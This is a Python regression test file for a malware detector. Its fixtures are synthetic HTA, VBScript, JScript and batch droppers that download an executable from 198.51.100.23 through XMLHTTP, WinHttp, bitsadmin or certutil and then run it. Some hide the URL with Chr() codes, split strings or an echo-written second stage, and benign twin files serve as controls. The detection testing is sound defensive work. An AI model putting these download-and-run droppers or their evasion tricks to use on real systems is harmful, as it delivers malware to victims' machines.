"""Regression tests for the 2026-11-24 accuracy fix wave 4
(resolved script source). Campaign smoke run 6, on the wave 2 and
3 engine, returned NO ACCOUNTED again for miss-ledger samples 007
(a batch dropper) and 008 (an HTA downloader), while synthetic
fixtures of the shapes waves 2 and 3 imagined capped correctly.
The shapes below are built from the vendor-reported behaviours of
the real files and from the mechanics of the batch, VBScript and
JScript dialects themselves: variable-held URLs and destinations,
fragmented and grown URLs, Chr() character construction, the
XMLHTTP object model (fetch object, Open call and stream write on
separate lines), echo-written second stages, an encoding byte
past the format heuristic's window, and identical bytes under a
name with no extension. Synthetic fixtures only, authored here;
no sample was downloaded. See
validation/FIX-LOG-2026-11-24-WAVE4.md for the per-shape
diagnosis."""
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from event_zero.verdict import (verdict, script_class_findings,
                                written_stage_findings, _resolved_script_text)


def write(tmp_path, name, data, sub=""):
    d = tmp_path / sub if sub else tmp_path
    d.mkdir(parents=True, exist_ok=True)
    p = d / name
    p.write_bytes(data if isinstance(data, bytes) else data.encode())
    return str(p)


def scf_kinds(v):
    return [f["kind"] for f in v["files"][0].get("script_class_findings", [])]


def unresolved_targets(v):
    refs = v["files"][0].get("external_references") or {}
    return [r["target"] for r in refs.get("references", [])
            if r.get("disposition") == "unresolved"]


def unaccounted_text(v):
    return "\n".join(v["unaccounted"])


CRLF = "\r\n"

HTA_XMLHTTP_VAR = CRLF.join([
    '<html><head><HTA:APPLICATION ID="x" /></head>',
    '<script language="VBScript">',
    'Dim u, d',
    'u = "http://198.51.100.23/azienda.exe"',
    'd = "C:\\Users\\Public\\azienda.exe"',
    'Dim x',
    'Set x = CreateObject("MSXML2.XMLHTTP")',
    'x.Open "GET", u, False',
    'x.Send',
    'Dim s',
    'Set s = CreateObject("ADODB.Stream")',
    's.Type = 1',
    's.Open',
    's.Write x.responseBody',
    's.SaveToFile d, 2',
    'Dim w',
    'Set w = CreateObject("WScript.Shell")',
    'w.Run d, 0',
    'window.close',
    '</script><body></body></html>', ''])

HTA_XMLHTTP_CHR = CRLF.join([
    '<html><head><HTA:APPLICATION ID="x" /></head>',
    '<script language="VBScript">',
    'Dim u, d',
    'u = Chr(104) & Chr(116) & Chr(116) & Chr(112) & Chr(58) & Chr(47) & Chr(47) & "198.51.100.23" & Chr(47) & "p.exe"',
    'd = "C:\\Users\\Public\\p.exe"',
    'Dim x',
    'Set x = CreateObject("MSXML2.XMLHTTP")',
    'x.Open "GET", u, False',
    'x.Send',
    'Dim s',
    'Set s = CreateObject("ADODB.Stream")',
    's.Type = 1',
    's.Open',
    's.Write x.responseBody',
    's.SaveToFile d, 2',
    'CreateObject("WScript.Shell").Run d, 0',
    'window.close',
    '</script><body></body></html>', ''])

HTA_BITSADMIN_CONCAT = CRLF.join([
    '<html><head><HTA:APPLICATION ID="x" /></head>',
    '<script language="VBScript">',
    'Dim u, d, sh',
    'u = "http://198.51.100.23/p.exe"',
    'd = "C:\\Users\\Public\\p.exe"',
    'Set sh = CreateObject("WScript.Shell")',
    'sh.Run "bitsadmin /trans" & "fer job " & u & " " & d, 0, True',
    'sh.Run d, 0',
    'window.close',
    '</script><body></body></html>', ''])

HTA_WINHTTP_SHELLEXEC = CRLF.join([
    '<html><head><HTA:APPLICATION ID="x" /></head>',
    '<script language="VBScript">',
    'Dim d',
    'd = "C:\\Users\\Public\\p.exe"',
    'Dim req',
    'Set req = CreateObject("WinHttp.WinHttpRequest.5.1")',
    'req.Open "GET", "http://198.51.100.23/p.exe", False',
    'req.Send',
    'Dim s',
    'Set s = CreateObject("ADODB.Stream")',
    's.Type = 1',
    's.Open',
    's.Write req.ResponseBody',
    's.SaveToFile d, 2',
    'Dim sa',
    'Set sa = CreateObject("Shell.Application")',
    'sa.ShellExecute d, "", "", "open", 1',
    'window.close',
    '</script><body></body></html>', ''])

HTA_JSCRIPT_VAR = CRLF.join([
    '<html><head><HTA:APPLICATION ID="x" /></head>',
    '<script language="JScript">',
    'var u = "http://198.51.100.23/p.exe";',
    'var d = "C:\\\\Users\\\\Public\\\\p.exe";',
    'var x = new ActiveXObject("MSXML2.XMLHTTP");',
    'x.open("GET", u, false);',
    'x.send();',
    'var s = new ActiveXObject("ADODB.Stream");',
    's.Type = 1;',
    's.Open();',
    's.Write(x.responseBody);',
    's.SaveToFile(d, 2);',
    'var w = new ActiveXObject("WScript.Shell");',
    'w.Run(d, 0);',
    'window.close();',
    '</script><body></body></html>', ''])

HTA_XMLHTTP_EXTLESS = CRLF.join([
    '<html><head><HTA:APPLICATION ID="x" /></head>',
    '<script language="VBScript">',
    'Dim u, d',
    'u = "http://198.51.100.23/stage"',
    'd = "C:\\Users\\Public\\p.exe"',
    'Dim x',
    'Set x = CreateObject("MSXML2.XMLHTTP")',
    'x.Open "GET", u, False',
    'x.Send',
    'Dim s',
    'Set s = CreateObject("ADODB.Stream")',
    's.Type = 1',
    's.Open',
    's.Write x.responseBody',
    's.SaveToFile d, 2',
    'CreateObject("WScript.Shell").Run d, 0',
    'window.close',
    '</script><body></body></html>', ''])

HTA_DROPPER_W2 = ("<html><head><title>Invoice</title><HTA:APPLICATION ID=\"x\" /></head>\r\n"
                  "<script language=\"VBScript\">\r\n"
                  "Dim s: Set s = CreateObject(\"WScript.Shell\")\r\n"
                  "s.Run \"bitsadmin /transfer j http://198.51.100.23/p.exe %TEMP%\\p.exe\", 0\r\n"
                  "s.Run \"%TEMP%\\p.exe\", 0\r\n"
                  "window.close\r\n</script><body></body></html>\r\n")

CMD_BITSADMIN_JOB = CRLF.join([
    '@echo off',
    'set u=http://198.51.100.23/5441.exe',
    'set d=%TEMP%\\5441.exe',
    'bitsadmin /create job1',
    'bitsadmin /addfile job1 %u% %d%',
    'bitsadmin /resume job1',
    '%d%', ''])

CMD_CERTUTIL_EXTLESS = CRLF.join([
    '@echo off',
    'set u=http://198.51.100.23/stage',
    'set d=%TEMP%\\p.exe',
    'certutil -urlcache -f %u% %d%',
    '%d%', ''])

CMD_CERTUTIL_FRAGMENTS = CRLF.join([
    '@echo off',
    'set a=htt',
    'set b=p://198.51.100.23/p.exe',
    'set u=%a%%b%',
    'set d=%TEMP%\\p.exe',
    'certutil -urlcache -f %u% %d%',
    '%d%', ''])

CMD_CERTUTIL_GROWN = CRLF.join([
    '@echo off',
    'set u=http://198.51.100.23/p',
    'set u=%u%.exe',
    'set d=%TEMP%\\p.exe',
    'certutil -urlcache -f %u% %d%',
    '%d%', ''])

CMD_CERTUTIL_VAR = CRLF.join([
    '@echo off',
    'set u=http://198.51.100.23/p.exe',
    'set d=%TEMP%\\p.exe',
    'certutil -urlcache -f %u% %d%',
    '%d%', ''])

VBS_CHR = CRLF.join([
    'Dim u, d',
    'u = Chr(104) & Chr(116) & Chr(116) & Chr(112) & Chr(58) & Chr(47) & Chr(47) & "198.51.100.23" & Chr(47) & "p.exe"',
    'd = "C:\\Users\\Public\\p.exe"',
    'Dim x',
    'Set x = CreateObject("MSXML2.XMLHTTP")',
    'x.Open "GET", u, False',
    'x.Send',
    'Dim s',
    'Set s = CreateObject("ADODB.Stream")',
    's.Type = 1',
    's.Open',
    's.Write x.responseBody',
    's.SaveToFile d, 2',
    'CreateObject("WScript.Shell").Run d, 0', ''])

CMD_ECHO_STAGE = CRLF.join([
    '@echo off',
    'set s=%TEMP%\\stage2.vbs',
    'echo Dim u : u = "http://198.51.100.23/p.exe" > %s%',
    'echo Dim x : Set x = CreateObject("MSXML2.XMLHTTP") >> %s%',
    'echo x.Open "GET", u, False >> %s%',
    'echo x.Send >> %s%',
    'echo Dim st : Set st = CreateObject("ADODB.Stream") >> %s%',
    'echo st.Type = 1 : st.Open : st.Write x.responseBody >> %s%',
    'echo st.SaveToFile "C:\\Users\\Public\\p.exe", 2 >> %s%',
    'echo CreateObject("WScript.Shell").Run "C:\\Users\\Public\\p.exe", 0 >> %s%',
    'wscript %s%', ''])

CMD_ECHO_STAGE_BENIGN = CRLF.join([
    '@echo off',
    'set s=%TEMP%\\hello.vbs',
    'echo MsgBox "Backup finished" > %s%',
    'wscript %s%', ''])

HTA_UI = CRLF.join([
    '<html><head><HTA:APPLICATION ID="x" /></head>',
    '<script language="VBScript">',
    'Sub ShowInfo',
    '  MsgBox "Quarterly figures are ready."',
    'End Sub',
    '</script><body><button onclick="ShowInfo">Show</button></body></html>', ''])

HTA_DATA_DISPLAY = CRLF.join([
    '<html><head><HTA:APPLICATION ID="x" /></head>',
    '<script language="VBScript">',
    'Dim x',
    'Set x = CreateObject("MSXML2.XMLHTTP")',
    'x.Open "GET", "https://example.com/data.json", False',
    'x.Send',
    'document.title = x.responseText',
    '</script><body></body></html>', ''])

HTA_DATA_STAGE = CRLF.join([
    '<html><head><HTA:APPLICATION ID="x" /></head>',
    '<script language="VBScript">',
    'Dim x, s',
    'Set x = CreateObject("MSXML2.XMLHTTP")',
    'x.Open "GET", "https://example.com/data.json", False',
    'x.Send',
    'Set s = CreateObject("ADODB.Stream")',
    's.Type = 1',
    's.Open',
    's.Write x.responseBody',
    's.SaveToFile "C:\\Users\\Public\\data.json", 2',
    '</script><body></body></html>', ''])

CMD_VAR_DATA = CRLF.join([
    '@echo off',
    'set u=https://example.com/data.json',
    'set d=%CD%\\data.json',
    'bitsadmin /transfer datajob %u% %d%',
    'echo fetched', ''])

CMD_LOCAL_TOOL = CRLF.join([
    '@echo off',
    'set T=C:\\Tools\\backup.exe',
    '%T% /quiet',
    'echo done', ''])


# ---- the 008 class: HTA fetch through the object model ----
def test_wave4_hta_xmlhttp_variable_url_blocks_no(tmp_path):
    # the fetch object is created on one line, the URL travels in
    # a variable, and the Open call is on a third line: no single
    # line holds the wave 2 pattern, and the URL was invisible to
    # R1 because the HTA branch never extracted body references
    v = verdict(write(tmp_path, "azienda_08.hta", HTA_XMLHTTP_VAR))
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"
    assert v["files"][0]["verdict"] == "YES: UNACCOUNTED"
    assert "remote-fetch-and-execute" in scf_kinds(v)
    assert "http://198.51.100.23/azienda.exe" in unresolved_targets(v)


def test_wave4_hta_chr_assembled_url_blocks_no(tmp_path):
    # no literal URL exists anywhere in the file: it is built
    # from Chr() character codes, the dialect's own construction
    v = verdict(write(tmp_path, "azienda_08.hta", HTA_XMLHTTP_CHR))
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"
    assert "http://198.51.100.23/p.exe" in unresolved_targets(v)


def test_wave4_hta_bitsadmin_concatenated_command_blocks_no(tmp_path):
    # the bitsadmin command string is broken by concatenation and
    # its URL and destination travel in variables
    v = verdict(write(tmp_path, "azienda_08.hta", HTA_BITSADMIN_CONCAT))
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"
    assert "remote-fetch-and-execute" in scf_kinds(v)


def test_wave4_hta_winhttp_shellexecute_blocks_no(tmp_path):
    v = verdict(write(tmp_path, "azienda_08.hta", HTA_WINHTTP_SHELLEXEC))
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"
    assert "remote-fetch-and-execute" in scf_kinds(v)


def test_wave4_hta_jscript_variable_url_blocks_no(tmp_path):
    v = verdict(write(tmp_path, "azienda_08.hta", HTA_JSCRIPT_VAR))
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"
    assert "http://198.51.100.23/p.exe" in unresolved_targets(v)


def test_wave4_hta_extensionless_url_composition_blocks_no(tmp_path):
    # the payload URL is extensionless, so R1 classifies it a
    # page and records it inert; what caps the file is the
    # composition: a fetch object, a stream write staging an
    # executable, and a shell run of the staged path
    v = verdict(write(tmp_path, "azienda_08.hta", HTA_XMLHTTP_EXTLESS))
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"
    assert "remote-fetch-and-execute" in scf_kinds(v)
    assert unresolved_targets(v) == []


# ---- the 007 class: batch indirection ----
def test_wave4_cmd_bitsadmin_job_variables_block_no(tmp_path):
    # the BITS job form (create, addfile, resume) never uses the
    # /transfer token wave 2 keys on, and URL and destination are
    # both variables; a neutral name isolates the mechanism from
    # the double-extension finding
    v = verdict(write(tmp_path, "job.cmd", CMD_BITSADMIN_JOB))
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"
    assert "remote-fetch-and-execute" in scf_kinds(v)


def test_wave4_cmd_certutil_extensionless_url_blocks_no(tmp_path):
    # certutil fetch fires in wave 2, but the chain needs a
    # payload or an execution side on the download line: the
    # destination is a variable, the invocation is a bare
    # variable line, and the extensionless URL classifies as an
    # inert page reference, so every wave 2 and 3 gate passed
    v = verdict(write(tmp_path, "update.cmd", CMD_CERTUTIL_EXTLESS))
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"
    assert "remote-fetch-and-execute" in scf_kinds(v)


def test_wave4_cmd_fragmented_url_blocks_no(tmp_path):
    # the URL is assembled from two set fragments and never
    # appears literally anywhere in the raw file
    v = verdict(write(tmp_path, "update.cmd", CMD_CERTUTIL_FRAGMENTS))
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"
    assert "http://198.51.100.23/p.exe" in unresolved_targets(v)


def test_wave4_cmd_grown_url_blocks_no(tmp_path):
    # the first literal is extensionless and inert; a second set
    # grows it into the payload URL
    v = verdict(write(tmp_path, "update.cmd", CMD_CERTUTIL_GROWN))
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"
    targets = unresolved_targets(v)
    assert "http://198.51.100.23/p.exe" in targets
    assert not any(t.endswith(".exe.exe") for t in targets)


def test_wave4_cmd_cp1252_byte_past_heuristic_window_blocks_no(tmp_path):
    # one cp1252 byte past the format heuristic's 4,096-byte
    # window: the format still reads text, but wave 3's strict
    # UTF-8 decode returned "" and the reference list came back
    # empty, so the file was acquitted on a reference scan that
    # never ran
    pad = CRLF.join(['@echo off'] * 300)
    pad += CRLF.join('rem lure text line number %d, agenzia delle entrate' % i
                     for i in range(60)) + CRLF
    body = (pad.encode() + 'echo comunicazione \xe0 te\r\n'.encode("latin1")
            + CMD_CERTUTIL_VAR.encode())
    assert len(body) > 6000 and body.find(b"\xe0") > 4096
    v = verdict(write(tmp_path, "update.cmd", body))
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"
    assert "http://198.51.100.23/p.exe" in unresolved_targets(v)


def test_wave4_vbs_chr_assembled_url_blocks_no(tmp_path):
    v = verdict(write(tmp_path, "dropper.vbs", VBS_CHR))
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"
    assert "http://198.51.100.23/p.exe" in unresolved_targets(v)


# ---- extensionless delivery: the class is in the content ----
def test_wave4_extensionless_batch_blocks_no(tmp_path):
    # the 007 dropper's content under a bare hash name: every
    # script treatment keyed on the extension, so the identical
    # bytes were judged as plain text
    name = "03e548ca313467cc8716fa135199414f36ca37884cd95b6cdd1b9a37c3bee71a"
    v = verdict(write(tmp_path, name, CMD_CERTUTIL_VAR))
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"
    assert "remote-fetch-and-execute" in scf_kinds(v)


def test_wave4_extensionless_hta_blocks_no(tmp_path):
    # the wave 2 HTA dropper's exact bytes, which cap under an
    # .hta name, under a bare hash name
    name = "04b5784000d66093995c13dddb0f346996aea2b7fc9ce0d420f5b596ad70fe72"
    v = verdict(write(tmp_path, name, HTA_DROPPER_W2))
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"
    assert "remote-fetch-and-execute" in scf_kinds(v)


def test_wave4_sniff_and_resolution_functions_directly():
    assert script_class_findings("noext", CMD_CERTUTIL_VAR.encode())
    resolved = _resolved_script_text(".cmd", CMD_CERTUTIL_FRAGMENTS)
    # the fragments assemble in the environment, and the command
    # line the host runs is the expanded one; assignment lines
    # are emitted as written (their values built the environment)
    assert "certutil -urlcache -f http://198.51.100.23/p.exe %TEMP%\\p.exe" in resolved


# ---- written second stages ----
def test_wave4_echo_written_stage_blocks_no(tmp_path):
    # the batch writes its dropper as a VBScript stage with echo
    # redirection and runs it through a variable-held path: the
    # behaviour lives in a file that is not in the submission
    v = verdict(write(tmp_path, "stage.cmd", CMD_ECHO_STAGE))
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"
    stages = v["files"][0].get("written_stage_findings", [])
    assert [f["kind"] for f in stages] == ["written-stage-unaccounted"]
    assert any("written-stage-unaccounted" in u for u in v["unaccounted"])


def test_wave4_written_stage_function_directly():
    findings, judged = written_stage_findings("stage.cmd", CMD_ECHO_STAGE.encode())
    assert [f["kind"] for f in findings] == ["written-stage-unaccounted"]
    assert judged == {"stage2.vbs"}
    findings, judged = written_stage_findings("notify.cmd", CMD_ECHO_STAGE_BENIGN.encode())
    assert findings == [] and judged == {"hello.vbs"}


# ---- benign twins: the same mechanics, accounted content ----
def test_wave4_benign_hta_ui_still_no(tmp_path):
    v = verdict(write(tmp_path, "panel.hta", HTA_UI))
    assert v["headline"] == "NO: NO MALWARE", v["files"][0]["why"]


def test_wave4_benign_hta_data_fetch_display_still_no(tmp_path):
    # an HTA that fetches data and displays it: the fetch object
    # is present, but nothing is staged and nothing is run, and
    # the reference is to data, which is inert
    v = verdict(write(tmp_path, "weather.hta", HTA_DATA_DISPLAY))
    assert v["headline"] == "NO: NO MALWARE", v["files"][0]["why"]


def test_wave4_benign_hta_data_staged_as_data_still_no(tmp_path):
    # the stream write stages what was fetched under a data
    # name: staging is judged on the staged content's class,
    # and data staged as data is accounted
    v = verdict(write(tmp_path, "cache.hta", HTA_DATA_STAGE))
    assert v["headline"] == "NO: NO MALWARE", v["files"][0]["why"]


def test_wave4_benign_cmd_variable_data_download_still_no(tmp_path):
    # the wave 2 data-download control with the URL and the
    # destination held in variables: resolution must not turn a
    # data fetch into a chain
    v = verdict(write(tmp_path, "refresh.cmd", CMD_VAR_DATA))
    assert v["headline"] == "NO: NO MALWARE", v["files"][0]["why"]
    assert v["files"][0].get("script_class_findings") is None


def test_wave4_benign_cmd_echo_stage_still_no(tmp_path):
    # a batch that writes a benign helper stage and runs it
    # through a variable: the stage is reconstructed and judged
    # clean, so the invocation is of examined content
    v = verdict(write(tmp_path, "notify.cmd", CMD_ECHO_STAGE_BENIGN))
    assert v["headline"] == "NO: NO MALWARE", v["files"][0]["why"]
    assert v["files"][0].get("written_stage_findings") is None
    assert v["files"][0].get("proxy_invocation_findings") is None


def test_wave4_benign_cmd_local_tool_variable_still_no(tmp_path):
    # a local tool invoked through a variable: resolution
    # exposes the invocation, and a machine-local accounted
    # program is not a fetch, a proxy target or a reference
    v = verdict(write(tmp_path, "backup.cmd", CMD_LOCAL_TOOL))
    assert v["headline"] == "NO: NO MALWARE", v["files"][0]["why"]
